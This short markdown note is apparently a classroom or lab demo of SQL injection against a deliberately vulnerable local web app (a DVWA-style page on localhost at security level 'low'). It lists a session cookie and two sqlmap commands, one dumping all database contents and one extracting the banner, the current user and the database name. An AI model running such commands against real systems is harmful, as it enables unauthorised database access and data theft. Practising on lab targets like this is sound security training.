# SQL Injection Demo

## URL to Test

[http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#](http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#)

## Cookie Data to Send

- PHPSESSID: `0bf460cc2a7016175bb93c7b6e82c30b`
- security: `low`

## Attack to Show All Data

```bash
sudo sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=0bf460cc2a7016175bb93c7b6e82c30b;security=low" --all
```

## Attack to Get Specific Data

```bash
sudo sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=0bf460cc2a7016175bb93c7b6e82c30b;security=low" --banner --current-user --current-db
```
